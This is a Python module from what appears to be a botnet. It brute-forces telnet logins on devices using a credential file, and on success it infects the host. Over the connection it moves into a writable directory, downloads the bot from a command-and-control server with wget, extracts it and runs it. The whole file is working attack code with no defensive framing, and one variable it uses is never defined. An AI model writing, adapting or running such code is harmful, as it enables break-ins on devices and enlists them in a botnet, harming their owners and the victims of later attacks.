# Module used to bruteforce logins to vulnerable devices

import socket
import sys
import telnetlib

from defs import (
    PROMPT, BOT_NAME, AUTH_PATH, DEBUG, PYTHON_WORKING_VERSIONS,
    CNC_SERV_ADDR
)

def infect_host(conn, target):
    '''
        Downloads the bot from the CNC server and executes it on the
        host machine

        * conn - handle to the telnet connection
        * target - target IP address

        Returns a boolean indicating if the host should be used in the
        botnet. If the host doesn't have python installed, for example,
        we cannot run any attack vectors or the bot itself, so we may
        as well not use this host.

        Note: Depending on how you have your CNC server(s) configured,
        you may want DOWNLOAD_ADDR to be a separate web server from
        where you run commands and read into the database
    '''

    print('[*] Attempting to infect host %s...' % target)

    # If python is not installed or we have incorrect version
    # we cannot run bot or attacks
    # Abort!
    conn.write('python --version\n')
    status = conn.expect(PYTHON_WORKING_VERSIONS)
    if status[0] == -1:
        print(
            '[-] No working version of python is installed on %s'
            % target
        )
        print('    Unable to infect host')
        print('    Refusing to append host to botnet')
        return False

    # Find location to download bot
    conn.write(
        '''
            cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
        '''
    )

    print(
        '[*] Attempting to download bot from %s to host %s...'
        % (BOT_LOC, target)
    )
    conn.write('wget http://%s/files/%s\n' % (CNC_SERV_ADDR, BOT_NAME))
    status = conn.expect(['OK'])
    if status[0] == 0:
        print('[+] Successfully downloaded bot to host %s!' % target)
    else:
        print('[-] Unable to download bot to host %s' % target)
        return True

    conn.write('tar -xzvf bot.tar.gz\n')
    status = conn.expect(['bot'])
    if status[0] == 0:
        print('[+] Successfully extracted bot to host %s!' % target)
    else:
        print('[-] Unable to extract bot to host %s' % target)
        return True

    conn.write('cd bot\n')
    conn.write('python bot.py\n')
    print('[+] Successfully executed bot on host %s!' % target)

    return True

def try_telnet_credentials(conn, username, password):
    '''
        Attempts to log into the vulnerable device given a username
        and password.

        * conn - handle to the telnet connection
        * username - username to try
        * password - password to try

        Returns a boolean indicating if the login attempt was
        successful
    '''

    print('Trying login: %s:%s' % (username, password))

    status = conn.expect(
        ['login: ', 'Login: ', 'incorrect', 'Incorrect']
    )
    if status[0] > 1 or status[0] == -1:
        return False

    conn.write(username + '\n')
    status = conn.expect(
        ['password: ', 'Password: ', 'incorrect', 'Incorrect']
    )
    if status[0] > 1 or status[0] == -1:
        return False

    conn.write(password + '\n')
    status = conn.expect(PROMPT)
    if status[0] == -1:
        return False

    return True

def login_telnet(target, port):
    '''
        Attempts to establish a connection to a vulnerable IP address
        using telnet

        * target - target IP address
        * port - target port (TELNET/23)

        Returns a username and password pair representing the login
        credentials. If no login credentials can be used, it returns
        a pair of Nonetypes.
    '''

    conn = telnetlib.Telnet(target, port)

    with open(AUTH_PATH, 'r') as f:
        for line in f:
            auth_ent = line.split()
            username = auth_ent[0]
            if len(auth_ent) == 1:
                password = ''
            else:
                password = auth_ent[1]

            if try_telnet_credentials(conn, username, password):
                print(
                    '[+] Successfully logged into %s:%d using %s:%s'
                    % (target, port, username, password)
                )
                if not DEBUG:
                    if not infect_host(conn, target):
                        return (None, None)
                conn.write('exit\n')
                conn.close()

                return (username, password)
            else:
                print(
                    '[-] Failed to log into %s:%d using %s:%s'
                    % (target, port, username, password)
                )

    conn.close()
    return (None, None)

def brute_credentials(target, port):
    '''
        Attempts to establish a connection to a vulnerable IP address
        and associated port. Currently only supports telnet.

        * target - target IP address
        * port - target port

        Returns a username and password pair representing the login
        credentials. If no login credentials can be used, it returns
        a pair of Nonetypes.
    '''

    print('Attempting login on %s:%d' % (target, port))

    if port == 23:
        return login_telnet(target, port)
    else:
        print('[-] No method to attack port %d' % port)
        return (None, None)
